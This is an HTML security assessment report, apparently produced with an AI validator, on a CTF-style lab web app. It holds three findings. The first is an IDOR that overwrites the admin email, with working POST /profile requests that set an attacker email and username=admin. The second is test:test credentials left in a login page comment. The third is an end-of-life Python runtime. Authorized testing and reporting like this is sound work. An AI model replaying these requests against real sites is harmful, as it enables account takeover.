@@ -1,0 +1,348 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqzuvief-ey5e5s</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [idor-write] Broken object-level authorization: arbitrary account email overwrite via hidden `username` field on POST /profile</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [info-disclosure] Valid credentials disclosed in login page HTML source comment</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] Outdated Python runtime 3.8.20 — end-of-life (2024-10-07), no security updates</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqzuvief-ey5e5s</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32787/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T23:35:25.920Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>3 mapped · 3 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32787</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">2</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [idor-write] Broken object-level authorization: arbitrary account email overwrite via hidden `username` field on POST /profile</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32787/</div>
+<div class="desc">POST /profile updates the email address of the user named in the request body's `username` field instead of the user identified by the authenticated session. The update form ships `username` as a hidden field pre-filled with the session user (&quot;test&quot;), but the server performs no check that the body `username` matches the session identity. Authenticated as the low-privilege user &quot;test&quot;, submitting `username=admin` causes the server to update ANOTHER account's (admin's) email; the application returns a marker (flag) emitted only on a cross-user write. This is a broken object-level authorization (IDOR-write / BOLA) flaw: any authenticated user can overwrite the email address of any other account, including admin, by changing a single client-controlled parameter. Because the overwritten email can then be used to initiate a password reset, this is a direct account-takeover vector against arbitrary users including the administrator.</div>
+<div><b>Reproduction</b></div><pre>1. Log in as the low-privilege user &quot;test&quot; (Flask session cookie {&quot;username&quot;:&quot;test&quot;}).
+2. Negative control — repeat the cross-user write UNAUTHENTICATED: POST /profile, headers cookie:&quot;&quot; authorization:&quot;&quot;, body `email=attacker_controlled@evil.com&amp;username=admin`. Returns 302 redirect to /, body len 189, no write, no flag (ev-mqzvf8kv-1n) — confirms the endpoint requires a session.
+3. Attack (authenticated as test) — POST /profile, body `email=attacker_controlled@evil.com&amp;username=admin`. Returns 200, body len 782, containing `flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}`, proving the server applied the email update to the admin account rather than to the session user &quot;test&quot;. Replayed twice, stable (ev-mqzvfa0k-1o, ev-mqzvfbaf-1p).
+4. Cross-check: a legitimate same-user write (body username=test) returns 200 with NO flag (len 732/735, ev-mqzvczj8-1i, ev-mqzvdq0k-1k), and the page header stays `&lt;h1&gt;Welcome, test&lt;/h1&gt;`, confirming the session identity is unchanged while the write targeted &quot;admin&quot;.
+Fix: derive the target account from the authenticated session only; never trust a client-supplied `username` to select the object being modified.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvf8kv-1n</code> — <code>artifacts/s-0003/ev-mqzvf8kv-1n/</code></div><div class="lbl">REQUEST</div><pre>POST /profile HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+email=attacker_controlled@evil.com&amp;username=admin</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 189
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:50:46 GMT
+location: /
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/&quot;&gt;/&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvfa0k-1o</code> — <code>artifacts/s-0003/ev-mqzvfa0k-1o/</code></div><div class="lbl">REQUEST</div><pre>POST /profile HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+email=attacker_controlled@evil.com&amp;username=admin</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 782
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:50:47 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Profile&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;profile-container&quot;&gt;
+        &lt;h1&gt;Welcome, test&lt;/h1&gt;
+        
+            &lt;p&gt;Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}&lt;/p&gt;
+        
+        &lt;form action=&quot;/logout&quot; method=&quot;post&quot;&gt;
+            &lt;button type=&quot;submit&quot;&gt;Logout&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;h2&gt;Update Email&lt;/h2&gt;
+        &lt;form action=&quot;/profile&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;New Email&quot; value=&quot;attacker_controlled@evil.com&quot; required&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;test&quot;&gt;
+            &lt;button type=&quot;submit&quot;&gt;Update Email&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvfbaf-1p</code> — <code>artifacts/s-0003/ev-mqzvfbaf-1p/</code></div><div class="lbl">REQUEST</div><pre>POST /profile HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+email=attacker_controlled@evil.com&amp;username=admin</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 782
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:50:49 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Profile&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;profile-container&quot;&gt;
+        &lt;h1&gt;Welcome, test&lt;/h1&gt;
+        
+            &lt;p&gt;Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}&lt;/p&gt;
+        
+        &lt;form action=&quot;/logout&quot; method=&quot;post&quot;&gt;
+            &lt;button type=&quot;submit&quot;&gt;Logout&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;h2&gt;Update Email&lt;/h2&gt;
+        &lt;form action=&quot;/profile&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;New Email&quot; value=&quot;attacker_controlled@evil.com&quot; required&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;test&quot;&gt;
+            &lt;button type=&quot;submit&quot;&gt;Update Email&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [info-disclosure] Valid credentials disclosed in login page HTML source comment</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32787/</div>
+<div class="desc">The unauthenticated login page (GET /) embeds an HTML comment `&lt;!-- test:test --&gt;` in its source that discloses valid working account credentials (username `test`, password `test`). Any visitor who views page source obtains a usable account. The credentials were confirmed valid: POST /login with username=test&amp;password=test returns 302 → /profile and issues a Flask session cookie (ev-mqzv3jma-j). This is sensitive information disclosure / hardcoded credentials in source. Severity medium: the leaked account is the standard low-privilege `test` user, but the exposure trivially defeats authentication for that account.</div>
+<div><b>Reproduction</b></div><pre>1) Request GET / with no session cookie → 200, body (524 bytes) contains the literal comment `&lt;!-- test:test --&gt;` (ev-mqzv1c11-d, ev-mqzv2vx0-g). 2) Use the disclosed pair: POST /login (form-encoded) username=test&amp;password=test → 302 redirect to /profile with Set-Cookie session (ev-mqzv3jma-j), proving the leaked credentials are valid. Negative control: GET / WITH a valid session returns a 302 redirect (203 bytes) to /profile and never serves the login HTML, so the comment is absent (ev-mqzuzbn4-1).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzuzbn4-1</code> — <code>artifacts/s-0001/ev-mqzuzbn4-1/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 203
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:38:23 GMT
+location: /profile
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/profile&quot;&gt;/profile&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzv1c11-d</code> — <code>artifacts/s-0001/ev-mqzv1c11-d/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 524
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:39:57 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;login-container&quot;&gt;
+        &lt;h1&gt;Login&lt;/h1&gt;
+        &lt;!-- test:test --&gt;
+        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required&gt;
+            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; required&gt;
+            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzv2vx0-g</code> — <code>artifacts/s-0001/ev-mqzv2vx0-g/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 524
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:41:09 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;login-container&quot;&gt;
+        &lt;h1&gt;Login&lt;/h1&gt;
+        &lt;!-- test:test --&gt;
+        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required&gt;
+            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; required&gt;
+            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [vulnerable-component] Outdated Python runtime 3.8.20 — end-of-life (2024-10-07), no security updates</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32787/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not exploited). The `Server` response header on every endpoint reveals `Werkzeug/3.0.6 Python/3.8.20`. CPython 3.8 reached END-OF-LIFE on 2024-10-07, and 3.8.20 (Sep 2024) was the final release of the 3.8 series — it receives no further security patches. Any vulnerability disclosed after EOL is permanently unpatched in this deployment. Concrete post-EOL example: CVE-2024-11168 (improper validation of bracketed hosts in urllib.parse) was fixed in 3.9.21 / 3.10.16 / 3.11.11 / 3.12.8 / 3.13.1 but NOT in the EOL 3.8 line, so it remains live here; further CPython CVEs disclosed through 2025 (e.g. the tarfile extraction-filter series) will likewise never be backported. Werkzeug 3.0.6 itself is NOT recorded — it was the Oct-2024 security release that fixed CVE-2024-49766/CVE-2024-49767 and has no known unpatched CVE; however the banner also indicates the app is served by the Werkzeug development server, which the operator should review separately (production-server misconfig, outside A06). Operator should VERIFY the runtime version and upgrade to a supported CPython (3.12.x / 3.13.x) before relying on this assessment.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32787/login (or any endpoint). 2. Inspect the `Server` response header → `Werkzeug/3.0.6 Python/3.8.20`. 3. The `Python/3.8.20` token identifies an EOL runtime (3.8 EOL 2024-10-07; 3.8.20 = final release). Reproduced on two consecutive 200 responses; the 404 control returns a distinguishable response from the same banner-bearing server.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvmnhw-26</code> — <code>artifacts/_/ev-mqzvmnhw-26/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-404-control HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:56:31 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvmlqw-24</code> — <code>artifacts/_/ev-mqzvmlqw-24/</code></div><div class="lbl">REQUEST</div><pre>GET /login HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 524
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:56:29 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;login-container&quot;&gt;
+        &lt;h1&gt;Login&lt;/h1&gt;
+        &lt;!-- test:test --&gt;
+        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required&gt;
+            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; required&gt;
+            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzvmmu3-25</code> — <code>artifacts/_/ev-mqzvmmu3-25/</code></div><div class="lbl">REQUEST</div><pre>GET /login HTTP/1.1
+Host: target.local:32787
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 524
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 23:56:31 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;login-container&quot;&gt;
+        &lt;h1&gt;Login&lt;/h1&gt;
+        &lt;!-- test:test --&gt;
+        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required&gt;
+            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; required&gt;
+            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
